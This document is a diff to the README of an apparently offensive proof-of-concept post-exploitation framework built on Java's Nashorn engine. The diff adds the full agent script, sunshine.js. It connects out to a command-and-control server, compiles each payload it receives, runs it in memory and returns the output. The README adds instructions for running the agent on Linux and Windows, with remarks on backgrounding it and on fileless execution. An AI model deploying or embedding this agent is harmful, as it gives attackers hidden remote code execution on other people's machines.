@@ -1,8 +1,25 @@
 # Longtime Sunshine
 
-Longtime Sunshine is a proof of concept Nashorn-based post exploitation framework. Nashorn is the JavaScript engine that Oracle introduced in Java 8. The engine's JavaScript implementation lacks any type of socket functionality, but does allow the programmer to invoke Java functionality. Nashorn also has an interesting property in that it can compile a string into memory executable bytecode. As such, a small amount of JavaScript/Java can be leveraged to load scripts from a remote user into memory.
+Longtime Sunshine is a proof of concept Nashorn based post exploitation framework. Nashorn is the JavaScript engine that Oracle introduced in Java 8. The engine's JavaScript implementation lacks any type of socket functionality, but does allow the programmer to invoke Java functionality. Also, Nashorn can compile a string to bytecode and execute out of memory. As such, a small amount of JavaScript/Java can be leveraged to load scripts from a remote user into memory. For example, sunshine.js:
 
-Nashorn can be invoked from the command line using 'jjs'. This tool gets installed along side the JRE.
+```
+var sock = new java.net.Socket("localhost", 1270);
+if (sock.isConnected())
+{
+  var input = new java.io.BufferedReader(new java.io.InputStreamReader(sock.getInputStream()));
+  var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream()));
+  var engine = new javax.script.ScriptEngineManager().getEngineByName("Nashorn");
+
+  while (sock.isConnected()) {
+    var payload = input.readLine();
+    engine.compile(payload).eval();
+    output.write(engine.invokeFunction("exec"));
+    output.flush();
+  }
+}
+```
+
+Nashorn can be invoked from the command line using 'jjs'. This tool is installed along side the JRE.
 
 ## Usage
 The command and control server, longtime.js, is written using node. Assuming you are using Ubuntu (or another Debian variant) you can execute the following commands to get the server running.
@@ -26,7 +43,7 @@ $
 
 Currently, the server is hardcoded to listen on '0.0.0.0:1270'.
 
-The agent, sunshine.js, can be executed using 'jjs' multiple ways. The first, and most obvious, is to simply execute the script:
+The agent, sunshine.js, can be executed using 'jjs' a couple of ways. The first, and most practical, is to simply execute the script:
 
 ```sh
 albinolobster@ubuntu:~/longtime_sunshine$ jjs sunshine.js &
@@ -34,17 +51,10 @@ albinolobster@ubuntu:~/longtime_sunshine$ jjs sunshine.js &
 albinolobster@ubuntu:~/longtime_sunshine$
 ```
 
-Similar example except with cmd.exe:
+Similar example, without backgrounding, with cmd.exe:
 
 ```sh
 C:\Program Files\Java\jre.1.8.0_151\bin>jjs C:\Users\albinolobster\Desktop\sunshine.js
-```
-
-On the server side you'll see something like this:
-
-```sh
-☀  Connection established by 127.0.0.1:47670
-$
 ```
 
 Of course, you can also just copy and paste sunshine.js into the jjs terminal for that true fileless feel, but that isn't really practical if you can't background or hide the terminal.
